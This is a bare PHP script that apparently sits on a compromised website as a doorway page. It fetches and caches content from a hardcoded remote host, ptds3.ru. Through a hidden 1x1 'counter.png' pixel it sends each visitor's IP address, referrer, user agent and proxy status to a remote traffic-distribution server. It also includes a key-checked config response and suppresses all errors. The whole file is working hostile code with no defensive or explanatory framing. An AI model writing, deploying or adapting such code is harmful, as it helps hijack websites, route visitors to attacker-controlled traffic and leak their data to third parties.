<?
$cacheip='194.28.70.132';$cachehost='ptds3.ru';$cacheurl='http://ptds3.ru/us_vsrc';$tds="http://spoilt.ptds2.ru/TDS.post.php";$tdsip="194.28.70.132";$lin="echo://";$esdid="emus";$key="bjijtyuumyummktyt865ue56yg56kmyjnkj67ti";
error_reporting(0);if($_GET["mode"]=="config" AND $key==$_GET['key']){echo '"pkey" value="'.$key.'"';die();}

$q=$_SERVER['PATH_INFO'];if(empty($q)){header('HTTP/1.1 302 Found');header('Location: '.$_SERVER['REQUEST_URI'].'/');}
$exte=explode(".", $q);foreach($exte as $extes){$ext=$extes;}if($ext=='png'){header("Content-type: image/png");}
if($ext=='gif'){header("Content-type: image/gif");}if($ext=='jpeg'){header("Content-type: image/jpeg");}
if($ext=='jpg'){header("Content-type: image/jpeg");}if($ext=='jpe'){header("Content-type: image/jpeg");}
if($ext=='css'){header("Content-type: text/css");}if($ext=='js'){header("Content-type: application/javascript");}

if($q=='/counter.png'){
$dom = explode("/", $tds);$dom=$dom[2];$dhost=$dom;if($tdsip){$dom=$tdsip;}$fp = fsockopen($dom, 80, $errno, $errstr, 2);
if(!$fp){$goto=$lin;}else{$t_dom=urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);$t_ref=$_GET['qr'];
$t_ip=urlencode($_SERVER["REMOTE_ADDR"]);$t_prox='no';if($_SERVER["HTTP_X_FORWARDED_FOR"]){$t_prox='yes';}$t_agent=urlencode($_SERVER['HTTP_USER_AGENT']);
$out = "GET ".$tds."?dom=".$t_dom."&ref=".$t_ref."&ip=".$t_ip."&prox=".$t_prox."&agent=".$t_agent."&esdid=".$esdid." HTTP/1.0\r\n";
$out .= "Host: ".$dhost."\r\n";$out .= "Connection: Close\r\n\r\n";fwrite($fp, $out);}die();}

////Ъни
$cq=str_replace('/','_',$q);if(file_exists('incoocies/'.$cq.'x')){echo file_get_contents('incoocies/'.$cq.'x');}else{
$cfp = fsockopen($cacheip, 80, $errno, $errstr, 30);$out = "GET ".$cacheurl.$q." HTTP/1.0\r\n";
$out .= "Host: ".$cachehost."\r\n";$out .= "Connection: Close\r\n\r\n";fwrite($cfp, $out);	
while (!feof($cfp)) {$str=fgets($cfp,128);if ($str=="\r\n" && empty($he)){$he = 'do';}if ($he=='do'){$goto.=$str;}}fclose ($cfp);$goto=substr($goto, 2);
echo $goto;mkdir('incoocies');file_put_contents('incoocies/'.$cq.'x', $goto);}

if($q=='/' or $q=='/index.php' or $q=='/index.htm' or $q=='/index.html'){echo '<img src="counter.png?qr='.urlencode($_SERVER[HTTP_REFERER]).'" width="1" height="1">';}
?>